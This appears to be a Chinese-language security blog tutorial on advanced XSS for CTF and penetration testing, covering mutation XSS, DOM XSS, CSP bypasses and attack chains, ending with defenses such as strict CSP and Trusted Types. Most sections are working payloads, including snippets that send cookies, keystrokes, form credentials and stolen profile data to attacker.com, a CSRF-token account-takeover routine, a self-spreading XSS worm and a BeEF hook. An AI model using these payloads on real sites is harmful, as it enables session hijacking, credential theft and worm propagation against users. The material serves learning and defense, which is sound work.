---
title: XSS讲解—高级利用技术与CSP深度绕过
date: 2026-09-12 20:00:00
categories: [Web安全, CTF]
tags: [XSS, Web安全, CSP绕过, CTF, DOM XSS, mutation XSS]
cover: /img/bg14.jpg
---

## XSS 的进阶视角

基础 XSS（反射型、存储型、DOM 型）和基础绕过（大小写、编码、事件处理器）是入门内容。高级 XSS 关注的是：在严格的 CSP、现代浏览器安全机制、复杂的前端框架下，如何构造可靠的利用链；以及 XSS 蠕虫、跨源数据窃取、浏览器侧信道等高级攻击技术。

本文假设读者已经掌握基础 XSS 原理，重点讲解高级利用技术。

<!-- more -->

## Mutation XSS（mXSS）

Mutation XSS 是一种利用浏览器 HTML 解析器的"变异"行为来绕过过滤的高级 XSS 技术。核心思想：输入经过过滤后看起来是安全的，但当浏览器把它插入到 DOM 中时，HTML 解析器会对其进行"变异"（mutate），最终生成的 DOM 和原始输入不同，从而触发 XSS。

### 经典案例：innerHTML 变异

```javascript
// 过滤函数：移除所有 <script> 标签
function filter(input) {
    return input.replace(/<script[\s\S]*?<\/script>/gi, '');
}

// 攻击者输入
var payload = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';

// 过滤后（看起来安全，没有 script 标签）
var filtered = filter(payload);

// 插入到 DOM
document.getElementById('output').innerHTML = filtered;
// 浏览器解析时，<noscript> 中的内容会被特殊处理
// 最终变异为：<img src=x onerror=alert(1)>，触发 XSS
```

### 利用 SVG / MathML 的解析差异

SVG 和 MathML 有自己的命名空间和解析规则，与 HTML 不同：

```html
<!-- SVG 中的 foreignObject 可以嵌入 HTML -->
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
<img src=x onerror=alert(1)>
</body></foreignObject></svg>

<!-- MathML 的解析变异 -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>
```

### 利用注释和 CDATA

```html
<!-- 利用 HTML 注释的解析变异 -->
<div><!--<img src="--><img src=x onerror=alert(1)//">-->

<!-- 利用 CDATA（XML 中） -->
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
```

mXSS 的关键是理解浏览器的 HTML 解析器是一个状态机，不同的上下文（noscript、svg、math、textarea、title 等）有不同的解析规则，过滤函数往往只考虑了普通 HTML 上下文，没有考虑这些特殊上下文的变异行为。

## DOM XSS 高级利用

DOM XSS 的漏洞完全在前端，服务器不参与。高级 DOM XSS 关注复杂的前端框架和现代 API 中的漏洞。

### 1. postMessage 漏洞

`window.postMessage` 是跨窗口通信的 API，如果目标页面没有正确验证消息来源（origin），攻击者可以构造恶意消息触发 XSS：

```javascript
// 漏洞代码（目标页面）
window.addEventListener('message', function(e) {
    // 没有验证 e.origin！
    document.getElementById('output').innerHTML = e.data;
});
```

```html
<!-- 攻击页面 -->
<iframe src="https://target.com/vulnerable" id="f"></iframe>
<script>
document.getElementById('f').onload = function() {
    this.contentWindow.postMessage(
        '<img src=x onerror=alert(document.domain)>',
        '*'  // targetOrigin 用 *
    );
};
</script>
```

高级利用：即使验证了 origin，如果验证逻辑有缺陷（如 `indexOf`、`endsWith` 绕过），仍然可以利用：

```javascript
// 有缺陷的验证
if (e.origin.indexOf('trusted.com') !== -1) { ... }
// 绕过：attacker.com/?trusted.com 或 trusted.com.attacker.com

if (e.origin.endsWith('trusted.com')) { ... }
// 绕过：eviltrusted.com
```

### 2. URL 解析差异

前端代码中对 URL 的解析往往存在漏洞：

```javascript
// 漏洞代码
var url = new URL(location.hash.slice(1));
if (url.hostname === 'trusted.com') {
    document.getElementById('frame').src = url.href;
}
```

绕过：利用 URL 解析器的差异（如 `https://trusted.com@evil.com`、`https://trusted.com.evil.com`、`https://evil.com#trusted.com` 等）。

### 3. 前端框架的危险 API

现代前端框架默认会转义输出，但有一些危险 API 可以绕过：

- **React**：`dangerouslySetInnerHTML`
- **Vue**：`v-html`
- **Angular**：`bypassSecurityTrustHtml`、`bypassSecurityTrustScript`
- **Svelte**：`{@html ...}`

高级 DOM XSS 往往是在这些危险 API 的调用链中找到用户可控的输入。

### 4. window.name 利用

`window.name` 属性在页面跳转后仍然保留，可以用来传递数据。如果目标页面读取 `window.name` 并插入到 DOM 中，就可以利用：

```html
<!-- 攻击页面 -->
<script>
window.name = '<img src=x onerror=alert(document.domain)>';
location = 'https://target.com/vulnerable';
</script>
```

## CSP 深度绕过

CSP（Content Security Policy）是防御 XSS 的重要机制。基础的 CSP 绕过（JSONP、unsafe-inline）是入门内容，高级绕过关注更复杂的场景。

### 1. CSP 严格动态（strict-dynamic）绕过

`strict-dynamic` 是 CSP3 的特性，它允许由已信任脚本加载的脚本执行，而不需要额外的白名单。但如果存在一个可控的脚本加载点，就可以绕过：

```http
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

如果页面中有一个带 nonce 的脚本，且它会动态加载用户可控的 URL，那么攻击者可以控制这个 URL 来加载恶意脚本。

### 2. 脚本链污染（Script Gadget）

即使 CSP 只允许加载特定域名的脚本，如果该域名上存在"脚本 gadget"（可以被滥用的合法脚本），就可以绕过 CSP。

经典的 script gadget：

```html
<!-- AngularJS gadget -->
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- jQuery gadget -->
<div class="thumbnail" data-caption="<img src=x onerror=alert(1)>">
<!-- 如果页面有 jQuery 且会解析 data-caption 为 HTML -->

<!-- Bootstrap gadget -->
<div data-toggle="tooltip" title="<img src=x onerror=alert(1)>">
```

这些 gadget 利用的是已被 CSP 允许的库（Angular、jQuery、Bootstrap）中的功能，不需要注入新的 `<script>` 标签。

### 3. CSP 报告端点滥用

如果 CSP 配置了 `report-uri` 或 `report-to`，可以通过构造 CSP 违规来外带数据：

```javascript
// 构造一个会触发 CSP 违规的请求，把数据编码在 URL 中
var img = document.createElement('img');
img.src = 'https://attacker.com/' + btoa(document.cookie);
// 这会触发 img-src 违规，违规报告中包含请求的 URL
```

### 4. 基于 DOM 的 CSP 绕过

CSP 是在文档加载时应用的，如果可以在 CSP 应用之前注入脚本，或者修改已经加载的 DOM，就可以绕过：

```javascript
// 如果可以控制 document.write 在 CSP meta 之前执行
document.write('<script>alert(1)</script>');
```

### 5. CSP 框架祖先绕过

`frame-ancestors` 限制了哪些页面可以 iframe 嵌入当前页面。但如果存在 CRLF 注入或 HTTP 头注入，可以覆盖 CSP 头：

```
http://target.com/page?param=%0d%0aContent-Security-Policy:%20frame-ancestors%20*
```

## XSS 高级利用链

### 1. 跨源数据窃取

XSS 的最终目标往往是窃取数据。高级窃取技术：

```javascript
// 窃取 CSRF token 并执行操作
async function stealAndAct() {
    // 获取页面中的 CSRF token
    var token = document.querySelector('meta[name=csrf-token]').content;
    
    // 以用户身份发送请求
    var resp = await fetch('/api/user/email', {
        method: 'POST',
        headers: {'X-CSRF-Token': token, 'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com'})
    });
    
    // 外带敏感数据
    var data = await fetch('/api/user/profile').then(r => r.text());
    new Image().src = 'https://attacker.com/collect?d=' + btoa(data);
}
```

### 2. XSS 蠕虫

XSS 蠕虫是一种可以自我传播的 XSS 攻击。经典案例是 2005 年的 MySpace Samy 蠕虫，24 小时内感染了 100 万用户。

```javascript
// 简化的 XSS 蠕虫
async function worm() {
    // 1. 把自己注入到用户的个人资料中
    var payload = '<script src="https://attacker.com/worm.js"></script>';
    await fetch('/api/profile/update', {
        method: 'POST',
        body: JSON.stringify({bio: payload})
    });
    
    // 2. 访问用户的好友列表，对每个好友的页面触发 XSS
    var friends = await fetch('/api/friends').then(r => r.json());
    friends.forEach(f => {
        // 访问好友页面，如果好友页面也有 XSS，就继续传播
        new Image().src = '/user/' + f.id + '?xss=' + encodeURIComponent(payload);
    });
}
worm();
```

### 3. 浏览器侧信道

XSS 可以用来进行浏览器侧信道攻击，获取跨源信息：

```javascript
// 利用 CSS 历史记录泄漏（已被现代浏览器修复，但原理值得了解）
// 利用 timing 攻击判断用户是否登录某个网站
var start = performance.now();
var img = new Image();
img.onload = img.onerror = function() {
    var time = performance.now() - start;
    // 登录状态和未登录状态的响应时间可能不同
    new Image().src = 'https://attacker.com/?logged=' + (time > 100);
};
img.src = 'https://target.com/api/user';
```

### 4. 键盘记录与表单劫持

```javascript
// 键盘记录
document.addEventListener('keypress', function(e) {
    new Image().src = 'https://attacker.com/key?k=' + e.key + '&t=' + Date.now();
});

// 表单劫持（在表单提交时窃取密码）
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function() {
        var data = new FormData(form);
        var creds = btoa(JSON.stringify(Object.fromEntries(data)));
        new Image().src = 'https://attacker.com/creds?d=' + creds;
    });
});
```

### 5. BeEF 框架利用

BeEF（Browser Exploitation Framework）是专业的 XSS 利用框架，一条 hook 语句就能接管浏览器：

```html
<script src="https://attacker.com:3000/hook.js"></script>
```

BeEF 提供的功能包括：
- 浏览器信息收集（插件、Cookie、本地存储）
- 社会工程学攻击（弹窗钓鱼、全屏劫持）
- 内网扫描和攻击（利用受害者浏览器位置扫描内网）
- 持久化（通过 localStorage、Service Worker）
- 模块系统（数百个利用模块）

## CTF 中的高级 XSS 题型

### 1. CSP 绕过题

题目设置了严格的 CSP，需要找到白名单中的可利用域名或 script gadget。

解题思路：
1. 分析 CSP 头，找出允许的脚本源
2. 在允许的域名上寻找 JSONP 端点或开放重定向
3. 寻找页面中已加载库的 script gadget
4. 利用 `strict-dynamic` 或 `nonce` 的缺陷

### 2. Bot 题（无头浏览器）

题目有一个 admin bot 会访问你提交的 URL，需要窃取 bot 的 Cookie 或让 bot 执行操作。

高级技巧：
- 处理 bot 的特殊行为（不执行 alert、有超时、可能有 headless 检测）
- 利用 bot 的权限访问只有 admin 能访问的页面
- 用 webhook 接收窃取的数据
- 利用 DNS 预取或 prefetch 外带数据（不需要 JS 执行）

```html
<!-- 不需要 JS 的数据外带 -->
<link rel="dns-prefetch" href="//FLAG.attacker.com">
<link rel="prefetch" href="https://attacker.com/?c=COOKIE">
```

### 3. DOM XSS 题

题目漏洞在前端 JS 中，需要审计前端代码找到危险的 sink（innerHTML、eval、document.write 等）和可控的 source（location、postMessage、window.name 等）。

高级技巧：
- 利用浏览器的 URL 解析差异
- 利用框架的模板注入（AngularJS、Vue）
- 利用 postMessage 的 origin 验证缺陷
- 利用 DOM clobbering（DOM 覆盖）

### 4. Mutation XSS 题

题目有 HTML 过滤函数，需要利用浏览器解析变异绕过过滤。

## 防御的深度

### 1. 输出编码（根本防御）

根据输出上下文选择正确的编码：HTML 内容、HTML 属性、JavaScript、URL、CSS。现代框架默认做了这件事。

### 2. 严格 CSP

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  upgrade-insecure-requests
```

关键点：
- 不要用 `unsafe-inline`（script-src）
- 用 nonce 或 hash 而不是域名白名单
- 禁用 `object-src`、`base-uri`
- 设置 `frame-ancestors` 防止点击劫持

### 3. Cookie 安全

```http
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict; Path=/
```

`HttpOnly` 让 JS 无法读取 Cookie，即使有 XSS 也偷不到会话。

### 4. Trusted Types

Trusted Types 是浏览器的新安全特性，强制要求在使用危险 API（innerHTML、eval 等）之前对数据进行类型转换，从根本上防止 DOM XSS：

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy
```

```javascript
// 创建可信类型策略
const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => DOMPurify.sanitize(input)
});

// 必须用策略创建的 HTML 才能赋值给 innerHTML
element.innerHTML = policy.createHTML(userInput);
```

## 总结

高级 XSS 的核心是**理解浏览器的内部机制**——HTML 解析器的状态机、DOM 的变异行为、CSP 的实现细节、前端框架的安全模型。从 Mutation XSS 到 script gadget，从 postMessage 漏洞到 CSP strict-dynamic 绕过，每一种高级技术都是在利用浏览器或前端框架的某个实现细节。

XSS 利用的最终目标不是弹一个 alert，而是**构建完整的攻击链**——窃取 Cookie、劫持会话、窃取数据、横向移动、持久化。理解这些高级利用技术，才能在真实的渗透测试和 CTF 比赛中应对复杂的场景。

防御 XSS 不能只靠输入过滤——HTML 的语法太灵活，过滤永远有遗漏。根本防御是输出编码 + 严格 CSP + Trusted Types + HttpOnly Cookie 的多层防御。
